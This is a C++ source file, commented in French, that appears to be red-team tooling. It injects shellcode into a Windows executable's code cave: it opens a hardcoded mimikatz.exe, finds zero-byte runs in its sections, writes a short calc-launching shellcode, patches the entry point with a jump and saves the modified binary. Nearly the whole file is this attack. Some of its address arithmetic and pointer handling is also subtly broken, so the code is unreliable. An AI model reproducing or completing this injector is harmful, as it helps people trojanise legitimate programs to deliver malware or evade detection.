#include <windows.h>
#include <stdio.h>
#include <cstdint>

// Fonction pour rechercher une cave dans la section donnée
LPVOID find_code_cave_in_section(LPBYTE section_base, DWORD section_size, DWORD code_size, DWORD min_cave_size)
{
    // Boucle sur chaque adresse dans la section
    LPBYTE pAddress = section_base;
    DWORD cave_size = 0;

    for (DWORD j = 0; j < section_size; j++)
    {
        if (pAddress[j] == 0x00) // Vérifie si l'adresse est libre
        {
            cave_size++;

            if (cave_size >= code_size + min_cave_size) // Vérifie si l'emplacement est suffisamment grand
            {
                return &pAddress[j - cave_size + 1];
            }
        }
        else
        {
            cave_size = 0;
        }
    }

    return NULL;
}




DWORD RVA2Offset(DWORD rva, PIMAGE_SECTION_HEADER section_header) {
    return rva - section_header->VirtualAddress + section_header->PointerToRawData;
}













int main(int argc, char* argv[])
{
    LPCSTR arg1 = "C:\\Users\\Nobody\\OneDrive - GROUPE ISAGRI\\red\\chat\\mimikatz.exe";


    printf("[+]\tLoading original file\n");
    HANDLE hFile = CreateFileA(arg1, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("\n[!]\tError: could not open file\n");
        return 1;
    }


    printf("[+]\tMap the file into memory\n");
    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMap == NULL)
    {
        CloseHandle(hFile);
        printf("\n[!]\tError: could not map file\n");
        return 1;
    }

    printf("[+]\tGet view on file\n");
    LPVOID pBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pBase == NULL)
    {
        CloseHandle(hMap);
        CloseHandle(hFile);
        printf("\n[!]\tError: could not get file view\n");
        return 1;
    }


    printf("[+]\tGet the DOS header\n");
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pBase;
    
    printf("[+]\tGet the NT header\n");
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((LPBYTE)pBase + dos_header->e_lfanew);

    printf("[+]\tGet the first section header\n");
    PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER)((LPBYTE)nt_headers + sizeof(IMAGE_NT_HEADERS));



    // lance un calc.exe
    unsigned char shellcode[] = "\x48\x31\xc9\x48\x81\xe9\xc4\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xce\xed\x84\x9a\x2b\x86\x80\x38\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4";




    printf("[+]\tSearch for code caves in each section\n");
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
    {
        LPBYTE section_base = (LPBYTE)pBase + section_header->VirtualAddress;
        DWORD section_size = section_header->SizeOfRawData;
        DWORD code_size = sizeof(shellcode);
        DWORD min_cave_size = code_size+1;
        // Search for a cave in the section
        LPVOID pCave = find_code_cave_in_section(section_base, section_size, code_size, min_cave_size);
        if (pCave != nullptr)
        {
            printf("[+]\tCode cave found in section %s\n", section_header->Name);


            

            
            // On récupère le point d'entrée relatif actuel du fichier PE
            DWORD entryPointRva = nt_headers->OptionalHeader.AddressOfEntryPoint;
            // A partir du RVA, on récupère le Offset (l'adresse mémoire) du point d'entrée
            DWORD entryPointOffset = RVA2Offset(entryPointRva, section_header);
            printf("[+]\tCurrent entry point offset : 0x%x\n", entryPointOffset);
            // On crée un pointeur à l'adresse mémoire (offset) du point d'entrée
            LPBYTE entryPoint = (LPBYTE)pBase + entryPointOffset;




            printf("[+]\tCalculating the new entry point RVA\n");
            // Le nouveau point d'entrée correspond à l'emplacement où se trouve le shellcode
            // Donc on soustrait à l'adresse mémoire de notre cave l'adresse mémoire de l'image de base (pBase est l'adresse de début du fichier mappé en mémoire) + le décalage du fichier PE
            DWORD newEntryPointRva = (DWORD)pCave - ( (DWORD)pBase + nt_headers->OptionalHeader.ImageBase );
            // A partir du nouveau RVA, on récupère le Offset (l'adresse mémoire) du nouveau point d'entrée
            // Cet offset représente le décalage entre le début de l'image de base mappée en mémoire et notre cave qui contient le shellcode
            DWORD newEntryPointOffset = RVA2Offset(newEntryPointRva, section_header);
            printf("[+]\tNew entry point offset : 0x%x\n", newEntryPointOffset);

            // On calcule le décalage entre le nouveau point d'entrée et l'actuel
            DWORD jumpOffset = newEntryPointOffset - entryPointOffset;
            printf("[+]\tjumpOffset value : 0x%x\n", jumpOffset);

            printf("[+]\tAdding JMP instruction to new entryPoint\n");
            // on modifie le point d'entrée actuel pour faire un JUMP vers le nouveau point d'entrée (grâce au décalage calculé)
            BYTE jumpInstruction[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
            *(DWORD*)&jumpInstruction[1] = jumpOffset;
            memcpy(entryPoint, jumpInstruction, sizeof(jumpInstruction));

            // Lecture des 5 premiers bytes à l'adresse du pointeur entryPoint
            BYTE bytes[5];
            memcpy(bytes, entryPoint, 5);
            // Affichage des 5 premiers bytes via un printf
            printf("[+]\tNew entry point value : ");
            for (int i = 0; i < 5; i++) {
                printf("%02X", bytes[i]);
            }
            printf("\n");


            printf("[+]\tApplying new entryPoint in PE header\n");
            // On met à jour l'adresse du nouveau point d'entrée dans les en-têtes du PE
            nt_headers->OptionalHeader.AddressOfEntryPoint = newEntryPointRva;
            

            printf("[+]\tWrite the shellcode to the cave\n");
            memcpy(pCave, shellcode, sizeof(shellcode));

            printf("[+]\tChange the cave memory permissions to allow execution\n");
            DWORD oldProtect;
            VirtualProtect(pCave, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);


            printf("[+]\tCalculate the size of the file\n");
            LARGE_INTEGER fileSize;
            GetFileSizeEx(hFile, &fileSize);
            DWORD dwFileSize = static_cast<DWORD>(fileSize.QuadPart);

            printf("[+]\tWrite the modified binary to disk\n");
            DWORD bytesWritten = 0;
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            WriteFile(hFile, pBase, dwFileSize, &bytesWritten, NULL);





            printf("\n[*]\tShellcode successfully injected\n");
            

            // Clean up and exit
            CloseHandle(hFile);
            return 0;

        }
        // Move on to the next section
        section_header++;
    }
    // If we get here, we couldn't find a suitable code cave
    printf("\n[+]\tError: Could not find a suitable code cave in the binary.\n");
    // Clean up and exit
    CloseHandle(hFile);
    return 1;
}
